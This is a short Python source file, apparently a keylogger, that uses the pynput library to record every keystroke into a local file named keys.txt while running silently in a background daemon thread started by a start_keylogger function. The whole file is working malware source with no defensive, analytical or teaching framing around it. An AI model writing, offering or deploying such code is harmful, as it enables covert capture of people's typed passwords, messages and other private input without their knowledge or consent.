from pynput import keyboard
import threading

def on_press(key):
    try:
        with open("keys.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("keys.txt", "a") as f:
            f.write(f"[{key.name}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    thread = threading.Thread(target=listener.start)
    thread.daemon = True
    thread.start()
